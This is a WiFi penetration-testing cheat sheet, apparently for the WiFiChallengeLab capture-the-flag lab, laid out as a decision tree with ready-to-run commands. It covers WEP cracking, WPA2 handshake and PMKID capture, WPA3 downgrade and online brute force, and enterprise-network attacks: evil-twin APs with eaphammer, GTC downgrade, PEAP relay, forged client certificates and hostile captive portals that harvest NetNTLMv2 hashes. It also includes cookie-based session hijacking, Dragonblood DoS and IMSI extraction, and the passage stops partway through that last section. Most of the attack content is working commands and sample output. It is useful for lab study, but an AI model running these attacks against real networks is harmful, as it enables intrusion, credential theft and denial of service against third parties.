# WiFi Hacking Tree

**Disclaimer:** This content is provided for educational purposes and authorized security testing only. Do not use these techniques against networks you do not own or have explicit written permission to test. The author assumes no liability for misuse, damage, or legal consequences. Always comply with applicable laws and regulations.



<a name="master-tree"></a>
## 1. Master Decision Tree

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Start: WiFi Penetration Test                     │
│              Goal: Find flag from AP or web server                  │
└─────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Step 0: Environment Setup                                          │
│  • airmon-ng check kill                                             │
│  • Create monitor interface                                         │
│  • Survey nearby networks                                           │
└─────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Step 1: Enumeration (airodump-ng --band abg)                       │
│  Output: BSSID, CH, ENC, CIPHER, AUTH, WPS, ESSID                   │
│  Clients: STATION, Probes, Notes                                    │
└─────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
        ┌─────────────────────┼─────────────────────┐
        │                     │                     │
        ▼                     ▼                     ▼
   ┌─────────┐          ┌──────────┐         ┌──────────┐
   │  OPN    │          │   WEP    │         │ WPA2-PSK │
   │ (Open)  │          │ (Legacy) │         │ (Encrypted)│
   └────┬────┘          └────┬─────┘         └────┬─────┘
        │                     │                    │
        │                     │                    ├── Has client?
        │                     │                    │    ├── Yes → Deauth + Handshake + Crack
        │                     │                    │    └── No → PMKID (hcxdumptool)
        │                     │                    │
        │                     │                    ├── Network absent + Probe seen?
        │                     │                    │    └── Yes → Rogue AP (hostapd-mana)
        │                     │                    │
        │                     │                    └── WPS enabled?
        │                     │                         └── Yes → reaver -K 1
        │                     │
        │                     ├── Has active client?
        │                     │    ├── Yes → besside-ng (automated)
        │                     │    └── No → Fake Auth + ARP Replay
        │                     │
        │                     └── Manual WEP:
        │                          aireplay-ng -1 (Fake Auth)
        │                          aireplay-ng --arpreplay
        │                          aircrack-ng
        │
        ├── Has Captive Portal?
        │    ├── Yes → MAC Spoofing + HTTP Sniff + Credential
        │    └── No → Connect + admin/admin + router flag
        │
        └── Post-exploitation:
             • airdecap-ng (decrypt traffic)
             • tshark (extract cookie, credential)
             • arp-scan (test Client Isolation)
             • curl -b "cookie" (Session Hijacking)

        ┌─────────────────────┼─────────────────────┐
        │                     │                     │
        ▼                     ▼                     ▼
   ┌─────────┐          ┌──────────┐         ┌──────────────┐
   │ WPA3-   │          │   MGT    │         │     OWE      │
   │ SAE     │          │(Enterprise)│        │ (Enhanced    │
   │         │          │          │         │  Open)       │
   └────┬────┘          └────┬─────┘         └──────┬───────┘
        │                    │                      │
        ├── Transition Mode  │                      ├── Direct connect (key_mgmt=OWE)
        │   (WPA2+WPA3)?     │                      │   → Works 99% of the time
        │   └── Yes →        │                      │
        │   Deauth + Handshake│                     └── If it fails:
        │   + Crack (WPA2)   │                          DragonDrain (DoS)
        │                    │                          → retry
        └── WPA3-only?       │
            └── wacker.py    │
                (online)     │
                             │
                             ├── 1. Passive Recon (no attack):
                             │   tshark → eap.identity (username)
                             │   tshark → tls.certificate (server cert)
                             │   → email, CN, domain
                             │
                             ├── 2. Identify EAP Method:
                             │   tshark -Y "eap" -e eap.type
                             │   ├── 4  → EAP-MD5 → hcxpcapngtool + hashcat 4800
                             │   ├── 13 → EAP-TLS → client certificate (Rogue AP)
                             │   ├── 21 → EAP-TTLS → eaphammer + asleap
                             │   ├── 25 → PEAP → eaphammer + asleap
                             │   ├── 6  → EAP-GTC → gtc-downgrade
                             │   ├── 18 → EAP-SIM → IMSI extraction
                             │   ├── 23 → EAP-AKA → IMSI extraction
                             │   └── 50 → EAP-AKA' → IMSI extraction
                             │
                             ├── 3. Attack based on Method:
                             │   ├── PEAP/TTLS:
                             │   │   ├── eaphammer --creds → MSCHAPv2
                             │   │   ├── asleap/hashcat -m 5500
                             │   │   └── or gtc-downgrade → plaintext
                             │   │
                             │   ├── EAP-TLS:
                             │   │   ├── Have real server cert?
                             │   │   │   ├── Yes → eaphammer --cert-wizard import
                             │   │   │   └── No → hostapd-wpe (accept any cert)
                             │   │   ├── Have CA.key?
                             │   │   │   └── Yes → generate fake cert for any user
                             │   │   └── Connect with fake cert → flag
                             │   │
                             │   └── Relay (PEAP):
                             │       berate_ap --wpa-sycophant
                             │       + wpa_sycophant
                             │       + Deauth vulnerable client
                             │
                             ├── 4. Online Brute-force:
                             │   air-hammer (user × pass)
                             │   or air-hammer (userlist × single pass)
                             │
                             └── 5. Evil Twin / Phishing:
                                 Client probing for another network?
                                 └── eaphammer --captive-portal
                                     or --hostile-portal
                                     → hashcat -m 5600 (NetNTLMv2)
                                     → or plaintext from POST
```

---

<a name="setup"></a>
## 2. Environment Setup and Tools

### 2.1. Full Wireless Card Reset

```bash
# Kill interfering processes
sudo pkill wpa_supplicant
sudo pkill dhclient
sudo pkill hostapd
sudo pkill eaphammer
sudo pkill aireplay-ng
sudo pkill airodump-ng
sudo pkill berate_ap
sudo pkill dnsmasq

# Reset NetworkManager and airmon
sudo systemctl stop NetworkManager
sudo airmon-ng check kill

# Remove all virtual interfaces
for i in $(iw dev | grep Interface | awk '{print $2}'); do
    sudo ip link set $i down 2>/dev/null
    sudo iw dev $i del 2>/dev/null
done

# Reset driver (for WiFiChallengeLab: mac80211_hwsim)
sudo modprobe -r mac80211_hwsim && sleep 2 && sudo modprobe mac80211_hwsim

# Restart NetworkManager (optional)
sudo systemctl start NetworkManager
```

### 2.2. Create Monitor Interface

```bash
# Method 1: airmon-ng (simplest)
sudo airmon-ng start wlan0

# Method 2: manual (if airmon-ng fails)
sudo iw phy phy0 interface add wlan0mon type monitor
sudo ip link set wlan0mon up
sudo iw dev wlan0mon set channel 44  # if channel is known

# Verify
iw dev
iw dev wlan0mon info   # should show type monitor
```

### 2.3. Key Note: Shared Interface

> ⚠️ **Important warning:** If `wlan0mon` is on the same `phy` as `wlan0` (managed), tools like `hcxdumptool` will fail with `failed to arm interface`.
>
> **Solution:** Create a dedicated monitor interface on a separate `phy`:
> ```bash
> # e.g., phy70 for hcxdumptool
> sudo iw phy phy70 interface add wlan6mon type monitor
> sudo ip link set wlan6mon up
> ```

---

<a name="recon"></a>
## 3. Phase 0: Enumeration and Recon

### 3.1. Comprehensive Scan

```bash
sudo airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg
```

**Important AP Columns:**

| Column | Meaning | Values |
|------|------|--------|
| **BSSID** | Router MAC | `F0:9F:C2:...` |
| **PWR** | Signal strength | Closer to 0 = stronger |
| **CH** | Channel | `1`, `6`, `11`, `44`, `48` |
| **ENC** | Encryption | `OPN`, `WEP`, `WPA2`, `WPA3` |
| **CIPHER** | Algorithm | `CCMP`, `TKIP`, `WEP` |
| **AUTH** | Authentication | `PSK`, `MGT`, `SAE`, `OWE` |
| **WPS** | WPS support | `0.0` (no), `2.0` (yes) |
| **ESSID** | Network name | `<length: 9>` = hidden |

**Important Client Columns:**

| Column | Meaning | Use |
|------|------|--------|
| **STATION** | Client MAC | Deauth target |
| **Probes** | Networks being sought | 🎯 **gold** for Evil Twin |
| **Notes** | `PMKID` or `WPA handshake` | Success indicator |
| `(not associated)` | Not connected | Scanning |

### 3.2. Save and Analyze Output

```bash
# Outputs: scan-01.cap, scan-01.csv, scan-01.kismet.*
ls ~/wifi/

# Search CSV
cat ~/wifi/scan-01.csv | grep "wifi-global"

# Extract with tshark
tshark -r ~/wifi/scan-01.cap -Y "wlan.fc.type_subtype == 4" -T fields -e wlan.sa -e wlan.ssid -e radiotap.channel.freq
```

### 3.3. Supplementary Recon Tools

```bash
# 1. WiFi_db (SQLITE database)
git clone https://github.com/r4ulcl/wifi_db.git
cd wifi_db
sudo python3 wifi_db.py -d ~/wifi/wifichallenge.SQLITE ~/wifi/
sudo sqlitebrowser ~/wifi/wifichallenge.SQLITE

# 2. wash (check WPS)
sudo wash -i wlan0mon -c <CH>

# 3. iw scan (check RSN Capabilities - PMF)
sudo iw dev wlan2 scan | grep -A 20 "wifi-IT" | grep -A 6 "RSN"
```

### 3.4. Interpreting RSN Capabilities (MFP/PMF Detection)

```
RSN Capabilities: 0x008c = 0000 0000 1000 1100
                    │                ││││
                    │                │││└── bit 2: 16-PTKSA-RC
                    │                ││└─── bit 3: 1-GTKSA-RC  
                    │                └┴──── bit 6,7: MFPR/MFPC
```

| MFPC (bit 7) | MFPR (bit 6) | Meaning | Does Deauth work? |
|:---:|:---:|------|:---:|
| 0 | 0 | PMF disabled | ✅ Yes |
| 1 | 0 | PMF optional | ✅ Yes (for non-MFP clients) |
| 1 | 1 | PMF required | ❌ No |

---

<a name="opn"></a>
## 4. Phase 1: OPN Branch (Open Network)

```
OPN (ENC = OPN)
│
├── Has Captive Portal?
│   │
│   ├── Yes → MAC Spoofing + HTTP Sniff
│   │   ├── 1. Scan and find valid client MAC
│   │   ├── 2. macchanger -m <CLIENT_MAC> wlan2
│   │   ├── 3. wpa_supplicant (key_mgmt=NONE)
│   │   ├── 4. dhclient (get IP)
│   │   ├── 5. airodump-ng -c <CH> -w capture
│   │   ├── 6. Wireshark → http.request.method == POST
│   │   └── 7. Extract user/pass → login → flag
│   │
│   └── No → Direct connection
│       ├── wpa_supplicant → dhclient
│       ├── ip route (find gateway)
│       └── http://<gateway> → admin/admin → flag
```

### 4.1. Open Network Configuration

```conf
# free.conf
network={
    ssid="wifi-free"
    key_mgmt=NONE
    scan_ssid=1
}
```

### 4.2. Connection Commands

```bash
# Connect
sudo wpa_supplicant -Dnl80211 -iwlan2 -c free.conf -B

# Get IP
sudo dhclient wlan2 -v

# Verify
ip a show wlan2
ip route | grep default
```

### 4.3. Bypass Captive Portal with MAC Spoofing

```bash
# 1. Find active client MAC from airodump-ng
# (STATION column with high Frames)

# 2. Stop NetworkManager and change MAC
sudo systemctl stop network-manager
sudo ip link set wlan2 down
sudo macchanger -m b0:72:bf:44:b0:49 wlan2
sudo ip link set wlan2 up

# 3. Reconnect (no login needed if MAC is in allowed list)
sudo wpa_supplicant -Dnl80211 -iwlan2 -c free.conf -B
sudo dhclient wlan2 -v
```

### 4.4. HTTP Sniffing and Credential Extraction

```bash
# Capture on target channel
sudo airodump-ng wlan0mon -c 6 -w ~/wifi/capture

# Wait for user login (3-5 minutes)

# Analyze in Wireshark
wireshark ~/wifi/capture-01.cap
# Filter: http.request.method == "POST"

# Or with tshark
tshark -r ~/wifi/capture-01.cap -Y "http.request.method == \"POST\"" -T fields -e http.file_data
```

**Example output:**
```
Username=free1&Password=Jyl1iq8UajZ1fEK&Submit=Login
```

---

<a name="wep"></a>
## 5. Phase 2: WEP Branch

```
WEP (ENC = WEP)
│
├── Automated method (fastest)
│   └── besside-ng -c <CH> -b <BSSID> wlan2 -v
│       (does Fake Auth + ARP Replay + IV collection + cracking)
│
└── Manual method (if besside-ng fails)
    │
    ├── 1. Capture data
    │   └── airodump-ng -c <CH> --bssid <BSSID> -w ~/wifi/wep wlan0mon
    │
    ├── 2. Fake Auth
    │   └── aireplay-ng -1 3600 -q 10 -a <BSSID> wlan0mon
    │
    ├── 3. ARP Replay
    │   └── aireplay-ng --arpreplay -b <BSSID> -h <YOUR_MAC> wlan0mon
    │
    ├── 4. Wait for IVs (20,000-50,000)
    │
    ├── 5. Crack
    │   └── aircrack-ng ~/wifi/wep-01.cap
    │
    └── 6. Connect
        └── wpa_supplicant with wep_key0
```

### 5.1. Automated Method with besside-ng

```bash
sudo besside-ng -c 3 -b F0:9F:C2:71:22:11 wlan2 -v
```

**Successful output:**
```
[02:35:38] Got key for wifi-old [11:bb:33:cd:55] 30044 IVs
[02:35:38] Pwned network wifi-old in 4:22 mins:sec
```

### 5.2. Manual Method (Step by Step)

```bash
# 1. Capture
sudo airodump-ng -c 3 --bssid F0:9F:C2:71:22:11 -w ~/wifi/wifi-old wlan0mon

# 2. Fake Auth (terminal 2)
sudo aireplay-ng -1 3600 -q 10 -a F0:9F:C2:71:22:11 wlan0mon

# 3. ARP Replay (terminal 3)
sudo aireplay-ng --arpreplay -b F0:9F:C2:71:22:11 -h BA:49:A9:53:A1:8C wlan0mon

# 4. If no ARP, send Deauth
sudo aireplay-ng --deauth 5 -a F0:9F:C2:71:22:11 -c <CLIENT_MAC> wlan0mon

# 5. Crack
sudo aircrack-ng ~/wifi/wifi-old-01.cap
```

### 5.3. Connect to WEP

```conf
# wep.conf
network={
    ssid="wifi-old"
    key_mgmt=NONE
    wep_key0=11bb33cd55
    wep_tx_keyidx=0
}
```

```bash
sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/wep.conf -B
sudo dhclient wlan2 -v
```

### 5.4. WEP Attacks Not in the Writeup (But Important!)

| Attack | Tool | Use |
|------|-------|--------|
| **Fragmentation** | `aireplay-ng -5` | Generate IVs without ARP |
| **ChopChop** | `aireplay-ng -4` | Crack without ARP |
| **KoreK** | `aircrack-ng -K` | Legacy method |
| **PTW** | `aircrack-ng` (default) | Fastest method |

---

<a name="wpa2"></a>
## 6. Phase 3: WPA2-PSK Branch

```
WPA2-PSK (ENC=WPA2, AUTH=PSK)
│
├── Has connected client?
│   │
│   ├── Yes → Deauth + Handshake + Crack
│   │   ├── 1. airodump-ng -c <CH> --bssid <BSSID> -w capture
│   │   ├── 2. aireplay-ng -0 10 -a <BSSID> -c <CLIENT>
│   │   ├── 3. Wait for [WPA handshake: ...]
│   │   ├── 4. aircrack-ng capture-01.cap -w rockyou.txt
│   │   └── 5. Connect + airdecap-ng + post-exploit
│   │
│   ├── No → PMKID Attack (Client-less)
│   │   ├── hcxdumptool -i wlan6mon -w pmkid.pcapng -c <CH>a --rds=2 -A
│   │   ├── hcxpcapngtool -o pmkid.22000 pmkid.pcapng
│   │   └── hashcat -m 22000 -a 0 pmkid.22000 rockyou.txt
│   │
│   └── Network absent + client Probe seen?
│       └── Rogue AP (hostapd-mana)
│           ├── hostapd-mana with essid=target, wpa_passphrase=12345678
│           ├── mana_wpaout=hostapd.hccapx
│           ├── Deauth client
│           ├── hashcat -m 22000 hostapd.hccapx
│           └── Connect
│
└── WPS enabled? (WPS column = 2.0)
    └── Go to WPS branch
```

### 6.1. Capture Handshake

```bash
# 1. Lock on target channel
sudo airodump-ng wlan0mon -c 6 --bssid F0:9F:C2:71:22:12 -w ~/wifi/psk

# 2. Deauth in another terminal
sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:12 -c <CLIENT_MAC> wlan0mon

# 3. Wait for success message at top of airodump:
# [ WPA handshake: F0:9F:C2:71:22:12 ]

# 4. Crack
aircrack-ng ~/wifi/psk-01.cap -w /root/rockyou-top100000.txt
```

**Successful output:**
```
KEY FOUND! [ starwars1 ]
```

### 6.2. PMKID Attack (Client-less)

```bash
# 1. Create dedicated monitor interface (important!)
sudo iw phy phy70 interface add wlan6mon type monitor
sudo ip link set wlan6mon up
sudo iw dev wlan6mon set channel 7

# 2. Run hcxdumptool
sudo hcxdumptool -i wlan6mon -w pmkid.pcapng -c 7a --rds=2 -A

# 3. Extract hash
hcxpcapngtool -o pmkid.22000 pmkid.pcapng

# 4. Crack
hashcat -m 22000 -a 0 pmkid.22000 /root/rockyou-top100000.txt --force
```

### 6.3. Rogue AP for Absent Network (hostapd-mana)

**Scenario:** `wifi-offices` network is unavailable, but clients still send Probe Requests.

```bash
# 1. Configure hostapd-mana
nano hostapd.conf
```

```conf
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=wifi-offices
mana_wpaout=hostapd.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```

```bash
# 2. Run Rogue AP
sudo hostapd-mana hostapd.conf

# 3. Deauth client from real AP (if present)
sudo aireplay-ng -0 10 -a <REAL_BSSID> -c <CLIENT_MAC> wlan0mon

# 4. When client connects, handshake is saved to hostapd.hccapx

# 5. Crack
hashcat -a 0 -m 22000 hostapd.hccapx /root/rockyou-top100000.txt --force
```

**Note:** If `hashcat -m 2500` errors:
```bash
# Convert hccapx to pcap
hcxhash2cap --hccapx=hostapd.hccapx -c aux.pcap
# Extract 22000
hcxpcapngtool aux.pcap -o hash.22000
# Crack
hashcat -m 22000 hash.22000 rockyou.txt
```

### 6.4. Connect + Decrypt + Post-Exploit

```conf
# psk.conf
network={
    ssid="wifi-mobile"
    psk="starwars1"
}
```

```bash
# Connect
sudo wpa_supplicant -Dnl80211 -iwlan3 -c psk.conf -B
sudo dhclient wlan3 -v

# Decrypt traffic
airdecap-ng -e wifi-mobile -p starwars1 ~/wifi/psk-01.cap
# Output: psk-01-dec.cap

# Analyze
wireshark ~/wifi/psk-01-dec.cap
# Filter: http

# Extract cookie
tshark -r ~/wifi/psk-01-dec.cap -Y "http.cookie" -T fields -e http.cookie

# Use cookie
curl -i -b "PHPSESSID=296228e3896440bd508d4c69e11e265c" http://192.168.2.1/
```

### 6.5. Test Client Isolation

```bash
# Connect to network
sudo wpa_supplicant -Dnl80211 -iwlan3 -c psk.conf -B
sudo dhclient wlan3 -v

# ARP scan
sudo arp-scan -I wlan3 -l

# Test access to another client's server
curl -s -m 3 http://192.168.2.7/ | grep -o 'flag{[^}]*}'
```

---

<a name="wpa3"></a>
## 7. Phase 4: WPA3-SAE Branch

```
WPA3-SAE (ENC=WPA3, AUTH=SAE)
│
├── Transition Mode (WPA2+WPA3)?
│   │   (RSN Auth Suites: PSK SAE)
│   │
│   ├── Yes → Downgrade Attack
│   │   ├── 1. Build Rogue AP with WPA2-PSK
│   │   ├── 2. hostapd-mana with wpa_key_mgmt=WPA-PSK
│   │   ├── 3. Deauth client (if PMF disabled)
│   │   ├── 4. Client connects to fake AP
│   │   ├── 5. WPA2 handshake captured
│   │   └── 6. hashcat -m 22000 (fast!)
│   │
│   └── WPA3-only
│       └── wacker.py (online brute-force)
│           ├── ./wacker.py --wordlist rockyou.txt --ssid <SSID>
│           │              --bssid <BSSID> --interface wlan2 --freq 2462
│           ├── Wait for "Found the password"
│           └── Connect with key_mgmt=SAE, ieee80211w=2
│
└── PMF required (MFP-required)?
    ├── Yes → Deauth won't work
    │         → Dragonblood DoS (dragondrain)
    └── No → Deauth possible
```

### 7.1. Detect Transition Mode

```bash
sudo iw dev wlan2 scan | grep -A 15 "wifi-IT"
```

**Output:**
```
RSN: * Authentication suites: PSK SAE
     * Capabilities: MFP-capable (0x008c)
```

| Auth Suites | Capabilities | Interpretation |
|-------------|--------------|--------|
| `PSK SAE` | MFP-capable | Transition Mode ✅ |
| `SAE` | MFP-required | WPA3-only ❌ |

### 7.2. Downgrade Attack (Transition Mode)

```conf
# hostapd-sae.conf
interface=wlan1
driver=nl80211
hw_mode=g
channel=11
ssid=wifi-IT
mana_wpaout=hostapd-management.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK     # ← WPA2, not SAE!
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```

```bash
# 1. Run Rogue AP
sudo hostapd-mana hostapd-sae.conf

# 2. Deauth client
sudo aireplay-ng -0 0 -a F0:9F:C2:1A:CA:25 -c 10:F9:6F:AC:53:52 wlan0mon

# 3. Crack handshake
hashcat -a 0 -m 2500 hostapd-management.hccapx rockyou.txt --force
```

### 7.3. wacker.py (Online Brute-force)

```bash
# Install
git clone https://github.com/blunderbuss-wctf/wacker.git
cd wacker

# Run
./wacker.py --wordlist ~/rockyou-top100000.txt \
            --ssid wifi-management \
            --bssid F0:9F:C2:11:0A:24 \
            --interface wlan2 \
            --freq 2462
```

**Note:** `--freq` must be the AP frequency (not channel):
- Channel 11 → 2462 MHz
- Channel 6 → 2437 MHz
- Channel 1 → 2412 MHz

### 7.4. Connect to WPA3-SAE

```conf
# wpa3.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1
network={
    ssid="wifi-management"
    key_mgmt=SAE
    proto=RSN
    pairwise=CCMP
    group=CCMP
    psk="chocolate1"
    ieee80211w=2      # ← PMF required!
}
```

```bash
sudo wpa_supplicant -i wlan2 -c wpa3.conf -B
sudo dhclient -v wlan2
```

### 7.5. Dragonblood DoS (WPA3-only, PMF required)

```bash
# Install
cd /root/tools/dragondrain-and-time/
autoreconf -i && ./configure && make

# Run
cd /root/tools/dragondrain-and-time/src/
sudo ./dragondrain -d wlan1mon -a F0:9F:C2:71:AF:2F -c 44 -b 54 -n 1 -r 200
```

**Success indicator:** `[ STATUS: 200 forged handshakes/sec ]`

---

<a name="mgt"></a>
## 8. Phase 5: WPA2-Enterprise (MGT) Branch

```
WPA2-Enterprise (AUTH=MGT)
│
├── Phase 0: Passive Recon (no attack)
│   ├── tshark -r cap -Y "eap.identity" -T fields -e eap.identity
│   │   → username (e.g., GLOBAL\GlobalAdmin)
│   │
│   └── tshark -r cap -Y "tls.handshake.certificate" -T fields -e tls.handshake.certificate
│       | xxd -r -p | openssl x509 -inform DER -noout -subject
│       → CN, O, emailAddress
│
├── Phase 1: Identify EAP Method
│   └── tshark -r cap -Y "eap" -T fields -e eap.type | sort | uniq -c
│       ├── 4  → EAP-MD5
│       ├── 6  → EAP-GTC
│       ├── 13 → EAP-TLS
│       ├── 21 → EAP-TTLS
│       ├── 25 → PEAP
│       ├── 18 → EAP-SIM
│       ├── 23 → EAP-AKA
│       └── 50 → EAP-AKA'
│
└── Phase 2: Attack based on Method
    │
    ├── EAP-MD5 (code 4)
    │   ├── hcxpcapngtool --eapmd5=legacy.hc4800 capture.cap
    │   └── hashcat -m 4800 -a 0 legacy.hc4800 rockyou.txt
    │
    ├── PEAP (code 25) or EAP-TTLS (code 21)
    │   │
    │   ├── Method 1: Evil Twin (eaphammer)
    │   │   ├── eaphammer --cert-wizard (generate cert)
    │   │   ├── eaphammer -i wlan2 --auth wpa-eap --essid "target"
    │   │   │            --creds --autocrack --wordlist rockyou.txt
    │   │   └── Deauth client
    │   │
    │   ├── Method 2: GTC Downgrade (if client validates cert)
    │   │   ├── eaphammer --creds --negotiate gtc-downgrade
    │   │   └── plaintext password in log
    │   │
    │   └── Method 3: Relay Attack
    │       ├── berate_ap --wpa-sycophant wlan1 lo target
    │       └── wpa_sycophant -c conf -i wlan3
    │
    ├── EAP-TLS (code 13)
    │   │
    │   ├── Case 1: Have real server cert
    │   │   └── eaphammer --cert-wizard import
    │   │       --server-cert server.crt --ca-cert ca.crt --private-key server.key
    │   │
    │   ├── Case 2: Have CA.key (best!)
    │   │   ├── openssl genrsa -out fake.key 2048
    │   │   ├── openssl req -new -key fake.key -out fake.csr
    │   │   └── openssl x509 -req -in fake.csr -CA ca.crt -CAkey ca.key -out fake.crt
    │   │
    │   └── Case 3: Have nothing
    │       └── hostapd-wpe (accept any cert)
    │
    ├── EAP-GTC (code 6)
    │   └── eaphammer --creds --negotiate gtc-downgrade
    │
    ├── EAP-SIM/AKA/AKA' (code 18/23/50)
    │   ├── 1. Passive: tshark -Y "eap.identity"
    │   ├── 2. If you only need IMSI:
    │   │   ├── hostapd with eap_sim_id=0
    │   │   ├── sim_db with fake IMSI
    │   │   └── tshark -Y "eap.type == 50" -V | grep IMSI
    │   └── 3. Extract IMSI from Identity
    │
    └── Online Brute-force (any Method)
        ├── air-hammer -i wlan3 -e target -p rockyou.txt -u userlist
        └── air-hammer -i wlan3 -e target -P 12345678 -u userlist
```

### 8.1. Passive Recon (Extract Username and Certificate)

```bash
# 1. Username from Identity
tshark -r ~/wifi/scanc44-01.cap -Y "eap.identity" -T fields -e eap.identity | sort -u
# Output: GLOBAL\GlobalAdmin, anonymous@CONTOSOREG, ...

# 2. Server certificate
tshark -r ~/wifi/global-01.cap \
  -Y "tls.handshake.certificate && wlan.sa == F0:9F:C2:71:22:17" \
  -T fields -e tls.handshake.certificate 2>/dev/null \
  | head -n 1 | xxd -r -p \
  | openssl x509 -inform DER -noout -subject -nameopt RFC2253
```

**Example output:**
```
subject=emailAddress=server@WiFiChallenge.com,CN=radius.wifichallenge.com,
        OU=Server,O=WiFiChallenge,L=Madrid,ST=Madrid,C=ES
```

### 8.2. Identify EAP Method

```bash
tshark -r capture.cap -Y "eap" -T fields -e eap.type | sort | uniq -c
```

**EAP code table:**

| Code | Method | Attack |
|:--:|--------|------|
| 1 | Identity | Passive (username) |
| 4 | EAP-MD5 | hashcat -m 4800 |
| 6 | EAP-GTC | gtc-downgrade |
| 13 | EAP-TLS | Client certificate |
| 18 | EAP-SIM | IMSI extraction |
| 21 | EAP-TTLS | eaphammer + asleap |
| 23 | EAP-AKA | IMSI extraction |
| 25 | PEAP | eaphammer + asleap |
| 50 | EAP-AKA' | IMSI extraction |

### 8.3. EAP-MD5 (Simplest)

```bash
# Extract hash
hcxpcapngtool --eapmd5=legacy.hc4800 legacy-01.cap

# Crack
hashcat -m 4800 -a 0 legacy.hc4800 /root/rockyou-top100000.txt
```

### 8.4. PEAP/TTLS (Most Common)

```bash
cd /root/tools/eaphammer

# 1. Generate fake certificate (with real cert details)
sudo python3 eaphammer --cert-wizard

# 2. Run Rogue AP
sudo python3 eaphammer -i wlan2 \
  --channel 44 \
  --auth wpa-eap \
  --essid "wifi-corp" \
  --creds \
  --autocrack \
  --wordlist /root/rockyou-top100000.txt

# 3. Deauth client (another terminal)
sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:1A -c 64:32:A8:07:6C:40 wlan0mon

# 4. If client validates cert (unknown CA error):
sudo python3 eaphammer -i wlan2 \
  --channel 44 \
  --auth wpa-eap \
  --essid "wifi-corp" \
  --creds \
  --negotiate gtc-downgrade
```

**MSCHAPv2 output:**
```
domain\username:  CONTOSO\juan.tr
challenge:        3b:04:8b:cb:93:78:9a:e3
response:         99:7e:f7:19:b2:b7:2f:e9:15:42:32:88:77:76:ab:a6:3d:ed:28:85:87:33:0a:62
hashcat NETNTLM:  juan.tr::::997ef...:3b048...
```

```bash
# Manual crack
echo 'juan.tr::::997ef...:3b048...' > hash.5500
hashcat -a 0 -m 5500 hash.5500 rockyou.txt --force
```

### 8.5. EAP-TLS (Hardest)

#### Case A: Have real server certificate

```bash
cd /root/tools/eaphammer

# Import real certificate
sudo python3 ./eaphammer --cert-wizard import \
  --server-cert /home/user/Downloads/server.crt \
  --ca-cert /home/user/Downloads/ca.crt \
  --private-key /home/user/Downloads/server.key

# Run Rogue AP
sudo python3 ./eaphammer -i wlan4 --auth wpa-eap --essid "wifi-corp" \
  --creds --negotiate balanced

# Deauth
sudo aireplay-ng -0 0 -a F0:9F:C2:71:22:1A -c 64:32:A8:BA:6C:41 wlan0mon
```

#### Case B: Have CA.key (Best!)

```bash
# Generate fake certificate for any user
openssl genrsa -out client.key 2048
openssl req -config client.conf -new -key client.key -out client.csr
openssl x509 -days 730 -extfile client.ext \
  -CA ca.crt -CAkey ca.key -CAserial ca.serial \
  -in client.csr -req -out client.crt
```

```conf
# wpa_tls.conf
network={
    ssid="wifi-global"
    scan_ssid=1
    proto=RSN
    key_mgmt=WPA-EAP
    eap=TLS
    identity="GLOBAL\GlobalAdmin"
    ca_cert="./ca.crt"
    client_cert="./client.crt"
    private_key="./client.key"
}
```

```bash
sudo wpa_supplicant -Dnl80211 -i wlan3 -c ~/Downloads/wpa_tls.conf -B
sudo dhclient wlan3 -v
```

### 8.6. Relay Attack (PEAP)

**Scenario:** Client rejects fake certificate. We relay the hash to the real AP.

```bash
# Terminal 1: Rogue AP
cd ~/tools/berate_ap/
sudo ./berate_ap --eap --mana-wpe --wpa-sycophant \
  --mana-credout outputMana.log -c 44 wlan1 lo wifi-regional-tablets

# Terminal 2: Relay
cd ~/tools/wpa_sycophant/
sudo ./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan3

# Terminal 3: Deauth
sudo aireplay-ng --ignore-negative-one -0 0 \
  -a F0:9F:C2:7A:33:28 -c 64:32:A8:A9:DE:55 wlan0mon
```

**`wpa_sycophant_example.conf`:**
```conf
network={
  ssid="wifi-regional"     # ← network you want to enter
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity=""
  anonymous_identity=""
  password=""
  eap=PEAP
  phase1="peapver=1"
  phase2="auth=MSCHAPV2"
  bssid_blacklist=F0:9F:C2:00:00:00   # ← ignore our fake AP
}
```

### 8.7. Brute-force with air-hammer

```bash
cd ~/tools/air-hammer

# Method 1: one user + password list
echo 'CONTOSO\test' > test.user
python2 ./air-hammer.py -i wlan3 -e wifi-corp -p rockyou.txt -u test.user

# Method 2: user list + one password (Password Spray)
cat /root/top-usernames-shortlist.txt | awk '{print "CONTOSO\\" $1}' > users.txt
python2 ./air-hammer.py -i wlan4 -e wifi-corp -P 12345678 -u users.txt
```

### 8.8. Evil Twin + Phishing (Hostile Portal)

**Scenario:** Client sends Probe for another network.

```bash
# 1. Run Rogue AP with Hostile Portal
cd ~/tools/eaphammer
sudo python3 ./eaphammer --essid "WiFi-Restaurant" --interface wlan2 --hostile-portal

# 2. Deauth client
sudo aireplay-ng --ignore-negative-one -0 0 \
  -a F0:9F:C2:71:22:17 -c 64:32:A8:BC:53:51 wlan0mon

# 3. Extract NetNTLMv2
cd ~/tools/eaphammer
cat logs/Responder-Session.log | grep NTLMv2 | grep Hash | awk '{print $9}' > responder.5600

# 4. Crack
hashcat -a 0 -m 5600 responder.5600 rockyou.txt --force
```

**Or with Captive Portal:**
```bash
sudo python3 ./eaphammer --essid "WiFi-Restaurant" --interface wlan4 --captive-portal

# Sniff POST
sudo tshark -i wlan4 -Y "http.request.method == \"POST\"" -T fields -e http.file_data
# Output: username=CORPO\god&password=tommy1
```

### 8.9. IMSI Extraction (EAP-SIM/AKA/AKA')

```bash
# 1. Passive: view Identity
sudo airodump-ng wlan0mon -c 48 --bssid F0:9F:C2:71:22:19 -w recon
tshark -r recon-01.cap -Y "eap.identity" -T fields -e eap.identity
# Output: 6214070028194561@wlan.mnc007.mcc214.wifichallenge.com

